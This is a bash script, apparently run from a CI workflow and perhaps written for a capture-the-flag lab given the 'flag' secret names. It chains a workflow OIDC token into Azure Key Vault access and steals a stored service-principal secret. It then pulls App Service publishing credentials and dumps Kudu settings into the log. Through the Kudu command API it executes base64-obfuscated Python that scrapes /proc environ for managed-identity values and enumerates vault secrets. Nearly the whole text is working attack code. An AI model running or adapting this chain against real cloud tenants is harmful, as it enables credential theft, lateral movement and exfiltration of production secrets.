#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"
PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36'
say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
BASE_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default')
BASE=$(echo "$BASE_R" | jq -r '.access_token // empty')
[[ -n "$BASE" ]] || { say BASE_FAIL; exit 0; }
RPT=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/reporting-service-principal?api-version=7.4")
RPT_ID=$(echo "$RPT" | jq -r '.value|fromjson|.appId // empty')
RPT_SEC=$(echo "$RPT" | jq -r '.value|fromjson|.clientSecret // empty')
RPT_TEN=$(echo "$RPT" | jq -r '.value|fromjson|.tenantId // empty')
RPT_ARM_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$RPT_TEN/oauth2/v2.0/token" -d "client_id=$RPT_ID" -d 'grant_type=client_credentials' -d "client_secret=$RPT_SEC" -d 'scope=https://management.azure.com/.default')
RPT_ARM=$(echo "$RPT_ARM_R" | jq -r '.access_token // empty')
say "RPT_ARM=$([[ -n "$RPT_ARM" ]] && echo OK || echo FAIL)"
BASE_URL="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RPT_ARM" -H 'Content-Length: 0' "$BASE_URL/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | jq -r '.properties.publishingUserName // empty' 2>/dev/null || true)
PP=$(echo "$PC" | jq -r '.properties.publishingPassword // empty' 2>/dev/null || true)
say "PUB_USER_SET=$([[ -n "$PU" ]] && echo yes || echo no) PUB_PASS_LEN=${#PP}"
[[ -n "$PU" && -n "$PP" ]] || { say PUB_FAIL; exit 0; }
SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
S=$(curl -sS --max-time 20 -u "$PU:$PP" "$SCM/api/settings")
say "SETTINGS_B64=$(printf '%s' "$S" | base64 -w0)"
ENVC=$(jq -nc '{command:"env | grep -E \"IDENTITY|MSI\" | sed -E \"s/=.*/=<set>/\"",dir:"/home/site/wwwroot"}')
EK=$(curl -sS --max-time 20 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$ENVC")
say "ENVKEYS_B64=$(printf '%s' "$EK" | base64 -w0)"
PYSRC=$(cat <<'PYEOF'
import os,json,urllib.request,base64
ie=os.environ.get('IDENTITY_ENDPOINT',''); ih=os.environ.get('IDENTITY_HEADER','')
if not ie or not ih:
    for p in ['/proc/1/environ','/proc/self/environ']:
        try:
            d={}
            for x in open(p,'rb').read().split(b'\0'):
                if b'=' in x:
                    k,v=x.split(b'=',1); d[k.decode(errors='ignore')]=v.decode(errors='ignore')
            ie=ie or d.get('IDENTITY_ENDPOINT',''); ih=ih or d.get('IDENTITY_HEADER','')
        except Exception: pass
print('IDENTITY_ENDPOINT_SET',bool(ie),'IDENTITY_HEADER_SET',bool(ih))
if not ie or not ih: raise SystemExit(0)
u=ie+'?resource=https://vault.azure.net&api-version=2019-08-01'
r=urllib.request.Request(u,headers={'X-IDENTITY-HEADER':ih})
tok=json.loads(urllib.request.urlopen(r,timeout=10).read()).get('access_token','')
print('MI_TOKEN_LEN',len(tok))
for vault in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
    for path in ['secrets?api-version=7.4','secrets/flag?api-version=7.4','secrets/FLAG?api-version=7.4']:
        try:
            q=urllib.request.Request(f'https://{vault}.vault.azure.net/{path}',headers={'Authorization':'Bearer '+tok})
            b=urllib.request.urlopen(q,timeout=10).read()
            print(vault,path,'HTTP',200,'B64',base64.b64encode(b).decode())
        except Exception as e: print(vault,path,'ERR',str(e)[:160])
PYEOF
)
PYB64=$(printf '%s' "$PYSRC" | base64 -w0)
CMD="python3 -c \"import base64;exec(base64.b64decode('$PYB64'))\""
PYC=$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')
PR=$(curl -sS --max-time 40 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$PYC")
say "KUDU_PY_B64=$(printf '%s' "$PR" | base64 -w0)"
say DONE
